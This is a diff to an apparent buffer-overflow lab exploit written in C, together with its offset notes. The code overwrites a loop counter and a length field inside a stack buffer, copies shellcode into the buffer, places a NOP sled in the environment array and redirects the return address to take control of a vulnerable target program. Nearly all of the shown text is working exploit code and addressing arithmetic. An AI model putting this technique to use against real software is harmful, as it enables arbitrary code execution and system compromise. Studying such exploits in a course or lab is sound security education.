@@ -26,7 +26,7 @@ $3 = (int *) 0x2021fe48
 
 Offsets from buf[0] calculated from the difference in the address of the rip/variables from buf
 set buf[268] = len = (0x2021fe58 -0x2021fd40) + 3B = 283  (difference btw address of rip and buf[0] and with extra 3B because the return address is 4B long) 
-set buf[264] = i = 267 (skip copying buf[266])
+set buf[264] = i = 267 (skip to 267 to avoid the zeros in buf)
 set env[1] = &buf + 280 = return value = 0x2021fd40
 set env[0] = NULL
 
@@ -52,10 +52,9 @@ main ( int argc, char * argv[] )
         buf[i] = shellcode[i-19];
     
       
-    //write 264 to i = 0x010b to skip buf[266]
+    //write 267 to i = 0x010b (the 0x01 part is already on the stack at &i because the current value of i is 0x0108 =264)
     buf[264] = '\x0b';
-    buf[265] = '\x01';
-      
+    
     // write '283' = 0x011b to len starting at buf[264]
     buf[268] = '\x1b';
     buf[269] = '\x01';
@@ -64,7 +63,6 @@ main ( int argc, char * argv[] )
     args[1] = buf;
     args[2] = NULL;
     env[0] = &buf[270];
-    
     // save buf address 0x2021fd40
     env[1] = "\x90\x90\x90\x90"
              "\x90\x90\x90\x90"
